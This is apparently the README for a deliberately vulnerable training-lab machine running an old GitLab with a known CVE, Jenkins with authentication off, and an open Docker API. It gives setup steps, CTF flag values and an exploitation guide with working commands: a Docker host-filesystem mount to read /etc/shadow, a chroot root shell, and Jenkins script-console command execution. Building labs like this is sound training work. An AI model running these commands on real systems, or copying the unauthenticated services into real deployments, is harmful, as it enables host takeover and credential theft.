# 🏢 VulnCorp — Machine 9: int-dev01 (DevOps Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 9 runs on **Ubuntu 24.04** (login user `debian`). It serves **GitLab CE 13.10.2 (CVE-2021-22205)** in Docker on port **80**, **Jenkins 2.387.3 with authentication disabled** in Docker on port **8080**, and the **host Docker API on `0.0.0.0:2375`**. SSH is only the host `sshd` on port **22**.

Do not put the host address in `docker-compose.yml`. `up.sh` detects the current DHCP address, writes it to `.env` as `HOST_IP`, and GitLab uses that as `external_url`. After the address changes, run `up.sh` again.

---

## Deploy on Ubuntu 24.04 (`192.168.10.99`)

The account name is `debian`, but the OS is Ubuntu. Run package commands with `sudo`. Use Docker’s **Ubuntu** repository (`noble`). The API on port 2375 reports this host engine, because the lab container proxies `/var/run/docker.sock`.

GitLab 13.10.2 is started with one Puma process and monitoring off so a lab VM can serve the sign-in page without an 8 GB production install. It still needs a few minutes before port 80 answers, and it will use swap on a 4 GB VM.

```bash
sudo bash machines/int-dev01/install-docker-ubuntu.sh
docker version
docker compose version
```

Copy this `machines/int-dev01` directory onto the host, then start it:

```bash
cd /opt/int-dev01
sudo bash up.sh
docker compose ps
```

If this host previously ran GitLab 14.0.12, remove the old GitLab volumes before the first start of 13.10.2. GitLab will not boot 13.10 on 14.0 data:

```bash
docker compose down
docker volume rm int-dev01_gitlab_config int-dev01_gitlab_data int-dev01_gitlab_logs
docker compose up -d
```

Wait until `http://192.168.10.99` shows the sign-in page, then scan that address. The root password is printed once in `docker logs vulncorp-gitlab`.

| Check | Expected |
| --- | --- |
| `curl -sI http://192.168.10.99/users/sign_in` | GitLab sign-in, not a proxy error |
| `curl -s http://192.168.10.99:8080/login` | Jenkins |
| `curl -s http://192.168.10.99:2375/version` | Host Docker `ApiVersion` and `Version` |

---

## 📡 Exposed Ports & Services

| Service | Host Port | Description | Vulnerability |
|---------|-----------|-------------|---------------|
| **GitLab CE** | `80` | GitLab 13.10.2 | In the CVE-2021-22205 version range (fixed in 13.10.3). OpenVAS NVT `1.3.6.1.4.1.25623.1.0.147055` matches this build from the HTTP version |
| **Jenkins** | `8080` | CI/CD Server | **Authentication Disabled** — Script Console allows instant system execution |
| **Docker Engine API** | `2375` | TCP Socket | **No TLS & No Authentication** — Container escape & root host filesystem mount |
| **SSH** | `22` | Host OpenSSH only | Password login. Ciphers and MACs exclude Terrapin algorithms so that check does not match |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Docker API Unauthenticated RCE (Host Escape)
```bash
# Query Docker daemon
curl http://192.168.10.99:2375/version

# Mount host root filesystem and read shadow file
docker -H tcp://192.168.10.99:2375 run -v /:/host --rm alpine cat /host/etc/shadow

# Spawn root shell on host
docker -H tcp://192.168.10.99:2375 run -v /:/host -it --rm alpine chroot /host /bin/bash
```

### 2. Jenkins Script Console RCE
Navigate to `http://192.168.10.99:8080/script` (no login required) and run Groovy code:
```groovy
println "id".execute().text
```

### 3. GitLab Hardcoded Secrets & CVE-2021-22205
GitLab 13.10.2 sets a random root password on first boot and prints it in the container log (`docker logs vulncorp-gitlab`). Use that password at `http://192.168.10.99` to find committed AWS keys, DB passwords, and Active Directory credentials.

### 4. SSH Access
```bash
ssh developer@<this-host>
# Password login on port 22
```

---

## 🏆 Flags

- **Docker API RCE Flag:** `/root/root.txt` (`VULN{d0ck3r_api_rce}`)
- **DevOps Secrets Flag:** `/opt/dev_flag.txt` (`VULN{d3v0ps_s3cr3ts_l3ak3d}`)
